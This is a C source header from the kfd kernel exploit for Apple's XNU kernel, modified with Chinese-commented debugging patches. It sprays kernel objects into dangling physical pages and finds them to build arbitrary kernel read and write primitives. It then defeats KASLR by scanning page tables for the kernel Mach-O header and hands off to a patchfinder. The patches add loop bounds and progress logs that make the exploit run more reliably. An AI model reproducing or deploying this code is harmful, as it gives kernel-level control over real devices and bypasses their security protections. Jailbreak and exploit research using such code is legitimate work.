/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef krkw_h
#define krkw_h

#define kread_from_method(type, method)                                             \
    do {                                                                            \
        volatile type* type_base = (volatile type*)(uaddr);                         \
        u64 type_size = ((size) / (sizeof(type)));                                  \
        for (u64 type_offset = 0; type_offset < type_size; type_offset++) {         \
            type type_value = method(kfd, kaddr + (type_offset * sizeof(type)));    \
            type_base[type_offset] = type_value;                                    \
        }                                                                           \
    } while (0)

#include "krkw/kread/kread_kqueue_workloop_ctl.h"
#include "krkw/kread/kread_sem_open.h"

#define kwrite_from_method(type, method)                                       \
    do {                                                                       \
        volatile type* type_base = (volatile type*)(uaddr);                    \
        u64 type_size = ((size) / (sizeof(type)));                             \
        for (u64 type_offset = 0; type_offset < type_size; type_offset++) {    \
            type type_value = type_base[type_offset];                          \
            method(kfd, kaddr + (type_offset * sizeof(type)), type_value);     \
        }                                                                      \
    } while (0)

#include "krkw/kwrite/kwrite_dup.h"
#include "krkw/kwrite/kwrite_sem_open.h"

// Forward declarations for helper functions.
void krkw_helper_init(struct kfd* kfd, struct krkw* krkw);
int krkw_helper_grab_free_pages(struct kfd* kfd);
void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw);
void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw);
void krkw_helper_free(struct kfd* kfd, struct krkw* krkw);

#define kread_method_case(method)                                       \
    case method: {                                                      \
        const char* method_name = #method;                              \
        print_string(method_name);                                      \
        kfd->kread.krkw_method_ops.init = method##_init;                \
        kfd->kread.krkw_method_ops.allocate = method##_allocate;        \
        kfd->kread.krkw_method_ops.search = method##_search;            \
        kfd->kread.krkw_method_ops.kread = method##_kread;              \
        kfd->kread.krkw_method_ops.kwrite = NULL;                       \
        kfd->kread.krkw_method_ops.find_proc = method##_find_proc;      \
        kfd->kread.krkw_method_ops.deallocate = method##_deallocate;    \
        kfd->kread.krkw_method_ops.free = method##_free;                \
        break;                                                          \
    }

#define kwrite_method_case(method)                                       \
    case method: {                                                       \
        const char* method_name = #method;                               \
        print_string(method_name);                                       \
        kfd->kwrite.krkw_method_ops.init = method##_init;                \
        kfd->kwrite.krkw_method_ops.allocate = method##_allocate;        \
        kfd->kwrite.krkw_method_ops.search = method##_search;            \
        kfd->kwrite.krkw_method_ops.kread = NULL;                        \
        kfd->kwrite.krkw_method_ops.kwrite = method##_kwrite;            \
        kfd->kwrite.krkw_method_ops.find_proc = method##_find_proc;      \
        kfd->kwrite.krkw_method_ops.deallocate = method##_deallocate;    \
        kfd->kwrite.krkw_method_ops.free = method##_free;                \
        break;                                                           \
    }

void krkw_init(struct kfd* kfd, u64 kread_method, u64 kwrite_method)
{
    if (!kern_versions[kfd->info.env.vid].kread_kqueue_workloop_ctl_supported) {
        assert(kread_method != kread_kqueue_workloop_ctl);
    }

    if (kread_method == kread_sem_open) {
        assert(kwrite_method == kwrite_sem_open);
    }

    switch (kread_method) {
        kread_method_case(kread_kqueue_workloop_ctl)
        kread_method_case(kread_sem_open)
    }

    switch (kwrite_method) {
        kwrite_method_case(kwrite_dup)
        kwrite_method_case(kwrite_sem_open)
    }

    krkw_helper_init(kfd, &kfd->kread);
    krkw_helper_init(kfd, &kfd->kwrite);
}

int krkw_run(struct kfd* kfd)
{
    if(krkw_helper_grab_free_pages(kfd))
        return -1;

    timer_start();
    krkw_helper_run_allocate(kfd, &kfd->kread);
    krkw_helper_run_allocate(kfd, &kfd->kwrite);
    krkw_helper_run_deallocate(kfd, &kfd->kread);
    krkw_helper_run_deallocate(kfd, &kfd->kwrite);
    timer_end();
    
    return 0;
}

void krkw_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kfd->kread.krkw_method_ops.kread(kfd, kaddr, uaddr, size);
}

void krkw_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    kfd->kwrite.krkw_method_ops.kwrite(kfd, uaddr, kaddr, size);
}

void krkw_free(struct kfd* kfd)
{
    krkw_helper_free(kfd, &kfd->kread);
    krkw_helper_free(kfd, &kfd->kwrite);
}

/*
 * Helper krkw functions.
 */

void krkw_helper_init(struct kfd* kfd, struct krkw* krkw)
{
    krkw->krkw_method_ops.init(kfd);
}

int krkw_helper_grab_free_pages(struct kfd* kfd)
{
    timer_start();

    const u64 copy_pages = (kfd->info.copy.size / pages(1));
    const u64 grabbed_puaf_pages_goal = (kfd->puaf.number_of_puaf_pages / 4);
    const u64 grabbed_free_pages_max = 400000;

    /*
     * [MF PATCH 10] 进度日志
     *
     * 这个函数是 kopen 失败的头号嫌疑点（真机日志：
     *   "assertion failed: (landa retry limit reached)"）。
     * krkw_run 只有这一处能返回 -1。
     *
     * 它在数「number_of_puaf_pages 个悬空页里，还剩多少个仍持有哨兵」
     * —— 仍是哨兵 = 这页还没被系统回收利用。
     * 目标 = 页数/4；凑不够就放弃。
     *
     * 我们需要知道【差多少】才能判断是「内存压力」还是「PUAF 根本没建起来」：
     *   - 差一点（比如 480/512）→ 内存压力，降低页数或重试就行
     *   - 差很多（比如 3/512）  → landa 根本没喷出悬空页，问题在更底层
     */
    u64 mf_best = 0;
    u64 mf_iterations = 0;

    for (u64 grabbed_free_pages = copy_pages; grabbed_free_pages < grabbed_free_pages_max; grabbed_free_pages += copy_pages) {
        assert_mach(vm_copy(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size, kfd->info.copy.dst_uaddr));

        u64 grabbed_puaf_pages = 0;
        for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
            u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
            if (!memcmp(info_copy_sentinel, (void*)(puaf_page_uaddr), info_copy_sentinel_size)) {
                if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
                    print_u64(grabbed_free_pages);
                    if (mf_iterations > 0) {
                        printf("[mf] 悬空页达标：%llu/%llu（第 %llu 轮）\n",
                               (unsigned long long)grabbed_puaf_pages,
                               (unsigned long long)grabbed_puaf_pages_goal,
                               (unsigned long long)mf_iterations);
                        fflush(stdout);
                    }
                    timer_end();
                    return 0;
                }
            }
        }
        if (grabbed_puaf_pages > mf_best) mf_best = grabbed_puaf_pages;
        mf_iterations++;

        /* 每 5000 轮报一次进度，免得刷屏；也避免在长循环里毫无输出 */
        if (mf_iterations % 5000 == 0) {
            printf("[mf] grab_free_pages 进行中：轮 %llu，本轮 %llu/%llu，历史最好 %llu/%llu\n",
                   (unsigned long long)mf_iterations,
                   (unsigned long long)grabbed_puaf_pages,
                   (unsigned long long)grabbed_puaf_pages_goal,
                   (unsigned long long)mf_best,
                   (unsigned long long)grabbed_puaf_pages_goal);
            fflush(stdout);
        }
    }

    /* ★ 关键诊断：把「差多少」打出来 */
    printf("[mf] ✗ grab_free_pages 未达标：历史最好 %llu/%llu，跑了 %llu 轮\n",
           (unsigned long long)mf_best,
           (unsigned long long)grabbed_puaf_pages_goal,
           (unsigned long long)mf_iterations);
    printf("[mf]   判读：若历史最好接近目标 → 内存压力，降低 PUAF 页数或重试；\n"
           "[mf]         若几乎为 0       → landa 没喷出悬空页，问题在更底层\n");
    fflush(stdout);

    print_warning("failed to grab free pages goal");
    return -1;
}

void krkw_helper_find_kfd_offsets(struct kfd* kfd) {
    volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
    u64 pseminfo_kaddr = pnode->pinfo;
    u64 semaphore_kaddr = static_kget(struct pseminfo, psem_semobject, pseminfo_kaddr);
    
    u64 task_kaddr = static_kget(struct semaphore, owner, semaphore_kaddr);
    
    if(import_kfd_offsets() == -1) {
        //Step 1. break kaslr
        printf("kernel_task: 0x%llx\n", task_kaddr);
        
        uint64_t kerntask_vm_map = 0;
        kread((u64)kfd, task_kaddr + 0x28, &kerntask_vm_map, sizeof(kerntask_vm_map));
        kerntask_vm_map = UNSIGN_PTR(kerntask_vm_map);
        printf("kernel_task->vm_map: 0x%llx\n", kerntask_vm_map);
        
        uint64_t kerntask_pmap = 0;
        kread((u64)kfd, kerntask_vm_map + 0x40, &kerntask_pmap, sizeof(kerntask_pmap));
        kerntask_pmap = UNSIGN_PTR(kerntask_pmap);
        printf("kernel_task->vm_map->pmap: 0x%llx\n", kerntask_pmap);
        
        /* Pointer to the root translation table. */ /* translation table entry */
        uint64_t kerntask_tte = 0;
        kread((u64)kfd, kerntask_pmap, &kerntask_tte, sizeof(kerntask_tte));
        kerntask_tte = UNSIGN_PTR(kerntask_tte);
        printf("kernel_task->vm_map->pmap->tte: 0x%llx\n", kerntask_tte);
        
        uint64_t kerntask_tte_page = kerntask_tte & ~(0xfff);
        printf("kerntask_tte_page: 0x%llx\n", kerntask_tte_page);
        
        uint64_t kbase = 0;
        // [MF PATCH 06] 上游是 `while (true)` 且循环体里【没有任何下界检查】：
        //   若 val 永远不等于 0x100000cfeedfacf（例如 kernel_task->vm_map 的
        //   0x28 偏移在这个内核版本上不对），kerntask_tte_page 会一路 -0x1000
        //   减到 0 然后回绕 —— 永不退出，表现成 App 卡死在「启动内核」。
        //   这里加两道闸：① 内核地址下界 ② 迭代次数上限（防呆）。
        const uint64_t mf_kaslr_min_addr  = 0xfffff00000000000ULL;
        const u64      mf_kaslr_max_pages = 0x100000ULL;   // 1M 页 = 4GB 扫描窗口
        u64 mf_kaslr_scanned = 0;
        while (kerntask_tte_page >= mf_kaslr_min_addr && mf_kaslr_scanned < mf_kaslr_max_pages) {
            uint64_t val = 0;
            kread((u64)kfd, kerntask_tte_page, &val, sizeof(val));
            if(val == 0x100000cfeedfacf) {
                kread((u64)kfd, kerntask_tte_page + 0x18, &val, sizeof(val));
                //arm64e: check if mach_header_64->flags, mach_header_64->reserved are all 0
                //arm64: check if mach_header_64->flags == 0x200001 and mach_header_64->reserved == 0;  0x200001
                if(val == 0 || val == 0x200001) {
                    kbase = kerntask_tte_page;
                    break;
                }
            }
            kerntask_tte_page -= 0x1000;
            mf_kaslr_scanned++;
        }
        if (kbase == 0) {
            print_failure("kaslr scan gave up after %llu pages (addr now 0x%llx)", mf_kaslr_scanned, kerntask_tte_page);
            mf_kfd_fail_hook("kaslr scan found no kernel mach_header", __FILE__, __LINE__);
            return;
        }
        uint64_t vm_kernel_link_addr = get_vm_kernel_link_addr();
        printf("defeated kaslr, kbase: 0x%llx, kslide: 0x%llx\n", kbase, kbase - vm_kernel_link_addr);
        
        //Step 2. run patchfinder
        // [MF PATCH 02] 上游：printf("failed run_kfd_patchfinder\n"); exit(1);
        // 改成把失败交给宿主钩子（宿主 longjmp 回 mf_kopen，最终返回 -1）。
        if(run_kfd_patchfinder((u64)kfd, kbase) == -1) {
            print_failure("failed run_kfd_patchfinder (kbase = 0x%llx)", kbase);
            mf_kfd_fail_hook("run_kfd_patchfinder failed", __FILE__, __LINE__);
        }
    }
    
    //Step 3. set offsets from patchfinder / import_kfd_offsets().
    kern_versions[kfd->info.env.vid].kernelcache__cdevsw = off_cdevsw;
    kern_versions[kfd->info.env.vid].kernelcache__gPhysBase = off_gPhysBase;
    kern_versions[kfd->info.env.vid].kernelcache__gPhysSize = off_gPhysSize;
    kern_versions[kfd->info.env.vid].kernelcache__gVirtBase = off_gVirtBase;
    kern_versions[kfd->info.env.vid].kernelcache__perfmon_dev_open = off_perfmon_dev_open;
    kern_versions[kfd->info.env.vid].kernelcache__perfmon_devices = off_perfmon_devices;
    kern_versions[kfd->info.env.vid].kernelcache__ptov_table = off_ptov_table;
    kern_versions[kfd->info.env.vid].kernelcache__vn_kqfilter = off_vn_kqfilter;
    kern_versions[kfd->info.env.vid].proc__object_size = off_proc_object_size;
}

void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw)
{
    timer_start();
    const u64 batch_size = (pages(1) / krkw->krkw_object_size);

    while (true) {
        /*
         * Spray a batch of objects, but stop if the maximum id has been reached.
         */
        bool maximum_reached = false;

        for (u64 i = 0; i < batch_size; i++) {
            if (krkw->krkw_allocated_id == krkw->krkw_maximum_id) {
                maximum_reached = true;
                break;
            }

            krkw->krkw_method_ops.allocate(kfd, krkw->krkw_allocated_id);
            krkw->krkw_allocated_id++;
        }

        /*
         * Search the puaf pages for the last batch of objects.
         *
         * Note that we make the following assumptions:
         * - All objects have a 64-bit alignment.
         * - All objects can be found within 1/16th of a page.
         * - All objects have a size smaller than 15/16th of a page.
         */
        for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
            u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
            u64 stop_uaddr = puaf_page_uaddr + (pages(1) / 16);
            for (u64 object_uaddr = puaf_page_uaddr; object_uaddr < stop_uaddr; object_uaddr += sizeof(u64)) {
                if (krkw->krkw_method_ops.search(kfd, object_uaddr)) {
                    krkw->krkw_searched_id = krkw->krkw_object_id;
                    krkw->krkw_object_uaddr = object_uaddr;
                    goto loop_break;
                }
            }
        }

        krkw->krkw_searched_id = krkw->krkw_allocated_id;

        if (maximum_reached) {
loop_break:
            break;
        }
    }

    timer_end();
    const char* krkw_type = (krkw->krkw_method_ops.kread) ? "kread" : "kwrite";

    if (!krkw->krkw_object_uaddr) {
        for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
            u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
            print_buffer(puaf_page_uaddr, 64);
        }

        assert_false(krkw_type);
    }

    print_message(
        "%s ---> object_id = %llu, object_uaddr = 0x%016llx, object_size = %llu, allocated_id = %llu/%llu, batch_size = %llu",
        krkw_type,
        krkw->krkw_object_id,
        krkw->krkw_object_uaddr,
        krkw->krkw_object_size,
        krkw->krkw_allocated_id,
        krkw->krkw_maximum_id,
        batch_size
    );

    print_buffer(krkw->krkw_object_uaddr, krkw->krkw_object_size);

    if (!kfd->info.kaddr.current_proc) {
        krkw_helper_find_kfd_offsets(kfd);
        krkw->krkw_method_ops.find_proc(kfd);
    }
}

void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw)
{
    timer_start();

    for (u64 id = 0; id < krkw->krkw_allocated_id; id++) {
        if (id == krkw->krkw_object_id) {
            continue;
        }

        krkw->krkw_method_ops.deallocate(kfd, id);
    }

    timer_end();
}

void krkw_helper_free(struct kfd* kfd, struct krkw* krkw)
{
    krkw->krkw_method_ops.free(kfd);

    if (krkw->krkw_method_data) {
        bzero_free(krkw->krkw_method_data, krkw->krkw_method_data_size);
    }
}

#endif /* krkw_h */
